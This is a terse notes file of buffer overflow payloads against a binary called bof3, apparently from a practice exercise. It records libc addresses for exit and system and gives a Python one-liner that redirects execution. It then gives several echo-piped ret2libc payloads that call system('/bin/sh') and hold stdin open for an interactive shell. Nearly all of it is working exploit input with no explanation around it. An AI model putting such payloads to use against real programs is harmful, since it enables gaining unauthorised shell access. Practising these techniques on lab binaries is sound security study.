# address
0xf7e45f50 <exit>
0xf7e52e70 <system>

# 


# printf(buffer)
python3 -c 'print("A"*44 + "\\x50\\x83\\x04\\x08" + "BBBB" + "\\x60\\xa0\\x04\\x08")' | ./bof3

# system(ls)
(echo -e '/bin/sh\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x70\x2e\xe5\xf7BBBB\x60\xa0\x04\x08'; cat) | ./bof3

(echo -e '/bin/sh #AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x70\x2e\xe5\xf7BBBB\x60\xa0\x04\x08'; cat) | ./bof3

(echo -e '/bin/sh\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x90\xa1\xe5\xf7BBBB\x60\xa0\x04\x08'; cat) | ./bof3